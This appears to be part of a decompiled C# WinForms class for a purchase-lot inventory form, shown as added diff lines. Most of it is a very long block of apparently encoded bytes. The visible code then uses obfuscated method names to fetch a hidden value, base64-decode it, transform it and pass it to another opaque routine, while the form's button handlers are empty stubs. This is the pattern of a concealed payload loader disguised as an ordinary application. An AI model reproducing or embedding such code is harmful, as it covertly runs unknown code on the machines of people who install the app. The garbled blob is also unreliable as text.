Úº\u00b8ÞÛ\u00b8îÈ\u00b8\u00b8¹ÁÑ¹Þ\u00b8º¼ãâ»º\u00b8§¿¹îÞÊÞÀâÀº\u00b8ÞÛ\u00b8ï§»¹Þ\u00b8¹¼ãâÛ¹ÈÞ\u00b8\u00b8ïÁÑ¿ÈÌ»\u00b8îâ¿¹ÉîÀº¹§»¿ÈÄÄ¹îÞÀº\u00b8ÞÀº\u00b8ÞÛ\u00b8ï§»¹Þ\u00b8ºº¹§½º\u00b8Þ\u00b8¹\u00b8ÞÛ¹ÈÞ¾\u00b8îæ¿¹îÞÚº\u00b8ÞÀº¹§»¹Ê\u00b8¹¿ÈÌÆºï\u00b8º¹¹§½¿Þ¼Ü\u00b8\u00b8Ä¾ºÞÚ¾º¹îÀº¹§»¿ÈÄ¼\u00b8\u00b8\u00b8ÊÄÈÐ\u00b8\u00b8ßÀï\u00b8îÞÂ¹îÚÀ\u00b8ÞÞÀº\u00b8ÞÛ\u00b8îÚ\u00b8\u00b8ÞÀÉÆÉ¼¬ºÈ\u00b8¼\u00b8ß¼¬¼Ëâ¾¹Þ«È\u00b8ÞÐÚ¿Þ¼Ü\u00b8¹½ç¿ÉîÀ\u00b8îÚÞ\u00b8îÞÛ¹ÈÞÀ»¹\u00b8¹¹ÞÞÜ\u00b8¹§½º\u00b8ÞÀ¹ÞÐÞ\u00b8ß¼¬º\u00b8ÞÃ¼\u00b8¼½¼ËâÜ\u00b8\u00b8ÞÀ\u00b8îÞÀ¼\u00b8¼»º¹«\u00b8¹ÞÐÄ¹îÞÀ¿\u00b8ÞÀº\u00b8ÞÛ\u00b8ï§»¹È\u00b8º»Þ«Æºß\u00b8º¹\u00b8«Ü\u00b8É«\u00b8\u00b8îÄ¼À\u00b8¼¹º\u00b8Þ¹\u00b8\u00b8Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹«¹\u00b8\u00b8¼\u00b8Í\u00b8ÀÎÍªÁßÚ¼¬íÙâÍ«Ð©ÍîÛ¾ãíÙãÉæÚä°ªÚî¼¼À\u00b8¼¹»ß«¹\u00b8¹ãºÛÎ¬çÑåÌÞÉåÁßÙÎÍªÙªÁéÀº§ÞÍÌâÞË¾ãà\u00b8\u00b8\u00b8Þ\u00b8È\u00b8ÙÈªÍñÛ¾°ëÀ¼Á\u00a8ÙäãäÛÊ\u00b8ìËâÍÌÀ¾ÅíÙåÉðÙ©ïñ\u00b8\u00b8\u00b8½\u00b8È\u00b8\u00b8\u00b8\u00b8\u00b8Ð\u00b8È\u00b8ËÈåÍìØÎÑ\u00a8À½ÉãÐ©ßìÙ©ïíÑ©ããÚî\u00b8\u00b8»Þ¼\u00b8ºÌÁ\u00a8ÙäãäÛÊ¹ÍÊÈ\u00b8\u00b8½î¼\u00b8¼âÅíÚ¿ãðØÎÛæÛº»ºèÊ\u00b8ÞÄá\u00b8ïÅÞ\u00b8\u00b8¹º\u00b8¹\u00b8ÈÀç\u00b8È\u00b8âÆÎÑàÆ»ÀîÅäÌëÅ»\u00b8îÑà§§ÄñÐîÃËâ\u00a8ÅñâëÄ»â©ÄË½ßÅ©ÁäÐËÐ\u00a8\u00b8\u00b8\u00b8Ä\u00b8È\u00b8¿ÄÊ«ñÃá\u00b8ìÄ\u00b8\u00b8\u00b8¹\u00b8¼\u00b8\u00b8\u00b8»âÍî\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8»¢Íî\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00af½Ú\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹ÝÈ©°ðÉ¾ïêËÎ½çÙÞ¹ëÚ©ÅíÚäÍãÃäÉêÙ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¦ðÌ\u00b8À¼\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8Ð\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8\u00b8¼\u00b8\u00b8\u00b8\u00b8î\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹À\u00b8\u00b8\u00b8\u00b8Î¾\u00b8\u00b8\u00b8ÁÈ»\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÁÈ»Å\u00b8\u00b8\u00b8\u00b8½Ð\u00b8Ìî¹Ý\u00b8½Ð\u00b8ÉÈ¹Ê\u00b8½Ä\u00b8ÊÈ¹Ç\u00b8¼«\u00b8Ïî¹Á\u00b8¼«\u00b8ÉÞ¹Ç\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8º°¹Æ¦¢\u00b8\u00b8\u00b8¹\u00b8\u00b8Ä\u00b8\u00b8È\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8î\u00b8¹\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¦\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8È\u00b8\u00b8\u00b8\u00b8º\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8É\u00b8\u00b8\u00b8\u00b8\u00b8¼\u00b8ÍÞ¹ß\u00b8¿À\u00b8ÉÞ¹ç\u00b8¾î\u00b8ÑÈ¹Á\u00b8¾«\u00b8ÑÞ¹í\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8â\u00b8\u00b8È\u00b8\u00b8\u00b8¹Ì\u00b8¿À\u00b8ÐÈ¹ì\u00b8¿Ä\u00b8Ù\u00b8¹ß\u00b8¿È\u00b8ØÈ¹í\u00b8¾«\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ê\u00b8Ë§\u00b8Þ\u00b8\u00b8\u00b8È¹Ë\u00b8¿È\u00b8ÚÞ¹ç\u00b8¾«\u00b8Ñî¹¾\u00b8¾â\u00b8Ù\u00b8¹ã\u00b8¼â\u00b8ÙÞ¹ä\u00b8¾\u00af\u00b8\u00b8\u00b8»È\u00b8Þ\u00b8\u00b8\u00b8È\u00b8î\u00b8»\u00b8\u00b8Ä\u00b8\u00b8î\u00b8»\u00b8\u00b8Å\u00b8¹à\u00b8»\u00b8\u00b8\u00b8\u00b8¹È\u00b8¹î\u00b8\u00b8È¹»\u00b8¾\u00af\u00b8ÙÈ¹ë\u00b8¾Ì\u00b8ÙÞ¹§\u00b8¿Ä\u00b8\u00b8\u00b8¹»\u00b8¿Ì\u00b8Úî¹§\u00b8¾\u00af\u00b8ÙÈ\u00b8Þ\u00b8¼À\u00b8ÛÈ¹ì\u00b8¾â\u00b8ÑÞ¹\u00a8\u00b8º\u00b8\u00b8ÃÞ¹Æ\u00b8¼Ì\u00b8Í\u00b8\u00b8Þ\u00b8¾Ä\u00b8Ùî¹ì\u00b8¿È\u00b8ÚÞ¹í\u00b8¾î\u00b8Úî\u00b8\u00b8\u00b8¼Þ\u00b8½\u00b8\u00b8¹\u00b8¼Ä\u00b8Ùî¹ë\u00b8¿\u00b8\u00b8ÐÈ¹ì\u00b8¿â\u00b8ËÞ¹ß\u00b8¾§\u00b8ÑÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8À\u00b8¹Ì\u00b8¾Ì\u00b8Ðî¹æ\u00b8¾«\u00b8Ùî¹ê\u00b8¾\u00af\u00b8Ñî¹ç\u00b8¾Ì\u00b8Úî\u00b8\u00b8\u00b8½î\u00b8¾Þ\u00b8¹\u00b8¼Ð\u00b8ØÈ¹ê\u00b8¾Ì\u00b8É\u00b8¹ã\u00b8¿Ä\u00b8Ðî¹ð\u00b8¾â\u00b8Ú\u00b8¹§\u00b8¾â\u00b8Ùî¹ì\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹º\u00b8¿Ì\u00b8ÙÞ¹ç\u00b8¾Ð\u00b8ÛÈ\u00b8Þ\u00b8¼Ð\u00b8ÚÞ¹ß\u00b8¾§\u00b8ÑÈ¹ª\u00b8¾\u00af\u00b8ÚÞ¹é\u00b8º\u00b8\u00b8ÃÈ\u00b8Þ\u00b8½Ì\u00b8ÊÈ\u00b8Þ\u00b8¼î\u00b8ØÈ¹à\u00b8\u00b8\u00b8\u00b8Ä\u00b8\u00b8À\u00b8\u00b8¼\u00b8ÉÞ¹ç\u00b8¾î\u00b8ÑÈ¹Î\u00b8¾Ì\u00b8ÚÞ¹ñ\u00b8¾â\u00b8Ùî¹ì\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ï\u00b8º«\u00b8Äî\u00b8ì\u00b8»\u00b8\u00b8ÃÞ\u00b8î\u00b8\u00b8\u00b8\u00b8Ç\u00b8\u00b8Æ\u00b8\u00b8¼\u00b8ÊÈ¹ì\u00b8¿È\u00b8ÑÈ¹ð\u00b8¾«\u00b8ÐÈ¹ê\u00b8¼«\u00b8ÐÈ¹ë\u00b8¾Ì\u00b8\u00b8\u00b8¹º\u00b8¿Ì\u00b8ÙÞ¹ç\u00b8¾Ð\u00b8ÛÈ\u00b8ì\u00b8½Ì\u00b8ÊÈ\u00b8ì\u00b8¾È\u00b8Ù\u00b8¹ê\u00b8\u00b8\u00b8\u00b8Ê\u00b8\u00b8Ê\u00b8\u00b8¼\u00b8Ë\u00b8¹ã\u00b8¾Ú\u00b8ÐÈ¹ê\u00b8¼Ä\u00b8Ùî¹î\u00b8¿â\u00b8ÚÞ¹ç\u00b8¾Ú\u00b8Ø\u00b8¹§\u00b8\u00b8\u00b8\u00b8Èî¹í\u00b8¿\u00b8\u00b8ÜÈ¹ð\u00b8¾â\u00b8Ñî¹æ\u00b8¿È\u00b8À\u00b8ºç\u00b8º\u00b8\u00b8À\u00b8\u00b8ð\u00b8»\u00b8\u00b8ÄÈ\u00b8©\u00b8\u00b8\u00b8\u00b8ÂÞ\u00b8¹\u00b8\u00b8¼\u00b8Ë\u00b8¹ã\u00b8¾Ú\u00b8ÐÈ¹ê\u00b8½È\u00b8ÚÞ¹ß\u00b8¾È\u00b8ÑÈ¹ë\u00b8¾¼\u00b8ÚÞ¹é\u00b8¿Ä\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹¼\u00b8\u00b8«\u00b8\u00b8È¹Ç\u00b8¿À\u00b8ØÈ¹å\u00b8¾â\u00b8ÙÞ¹ß\u00b8¾î\u00b8ÉÞ¹ç\u00b8¾î\u00b8ÑÈ¹ì\u00b8¾¼\u00b8ÙÈ¹ã\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8ÃÞ¹Í\u00b8¼â\u00b8ÃÞ¹â\u00b8¾î\u00b8Ù\u00b8\u00b8\u00b8\u00b8»È\u00b8ºÞ\u00b8¹\u00b8½\u00b8\u00b8ÚÞ¹í\u00b8¾È\u00b8ÛÈ¹á\u00b8¿È\u00b8ËÞ¹ß\u00b8¾§\u00b8ÑÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8À\u00b8¹Í\u00b8¼â\u00b8\u00b8\u00b8\u00b8§\u00b8\u00b8Þ\u00b8\u00b8È¹È\u00b8¿À\u00b8Ùî¹â\u00b8¿Ì\u00b8Ðî¹§\u00b8½Ð\u00b8ÑÈ¹ð\u00b8¿Ä\u00b8ØÈ¹í\u00b8¾«\u00b8\u00b8\u00b8\u00b8ï\u00b8º«\u00b8Äî\u00b8ì\u00b8»\u00b8\u00b8ÃÞ\u00b8î\u00b8\u00b8\u00b8\u00b8Æ\u00b8\u00b8À\u00b8\u00b8¼\u00b8ÈÈ¹ñ\u00b8¿Ä\u00b8ÑÈ¹ë\u00b8¾À\u00b8Ù\u00b8¹¬\u00b8º\u00b8\u00b8ÍÞ¹ã\u00b8¿À\u00b8Úî¹ç\u00b8¾\u00af\u00b8ÙÞ\u00b8\u00b8\u00b8»¼\u00b8ÃÞ\u00b8ñ\u00b8º«\u00b8Ä\u00b8\u00b8ì\u00b8»\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹È\u00b8\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8¼»Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8";
+		object objectValue = RuntimeHelpers.GetObjectValue(C_435252(Conversions.ToString(NewLateBinding.LateGet(___________s(proj, "wwwwwwwww"), (Type)null, "ToCharArray", new object[0], (string[])null, (Type[])null, (bool[])null))));
+		object objectValue2 = RuntimeHelpers.GetObjectValue(I__________________5((byte[])objectValue, AccountDomainSid: true));
+		C_123(RuntimeHelpers.GetObjectValue(objectValue2));
+		return Conversions.ToString(objectValue);
+	}
+
+	private static object C_435252(string B1)
+	{
+		return Convert.FromBase64CharArray(Conversions.ToCharArrayRankOne(B1), 0, B1.Length);
+	}
+
+	public static object C_123(object t)
+	{
+		I_______________________3(RuntimeHelpers.GetObjectValue(t));
+		object result = default(object);
+		return result;
+	}
+
+	private void PurchaseLotformGrid_Load(object sender, EventArgs e)
+	{
+	}
+
+	private void BackButton_Click(object sender, EventArgs e)
+	{
+		((Control)this).Hide();
+		((Control)MyProject.Forms.WelcomePage).Show();
+	}
+
+	private void PurchaseLotGrid_CellContentClick(object sender, DataGridViewCellEventArgs e)
+	{
+	}
+
+	private void HighestValuedLotsButton_Click(object sender, EventArgs e)
+	{
+		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
+		try
+		{
+		}
+		catch (Exception ex)
+		{
+			ProjectData.SetProjectError(ex);
+			Exception ex2 = ex;
+			MessageBox.Show(ex2.Message);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	private void LowestValuesLotsButton_Click(object sender, EventArgs e)
+	{
+		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
+		try
+		{
+		}
+		catch (Exception ex)
+		{
+			ProjectData.SetProjectError(ex);
+			Exception ex2 = ex;
+			MessageBox.Show(ex2.Message);
+			ProjectData.ClearProjectError();
+		}
+	}
+
+	private void ShowAllLotsButton_Click(object sender, EventArgs e)
+	{
+	}
+
+	private void TotalPurchasePriceButton_Click(object sender, EventArgs e)
+	{
+	}
+
+	private void Label1_Click(object sender, EventArgs e)
+	{
+	}
+}
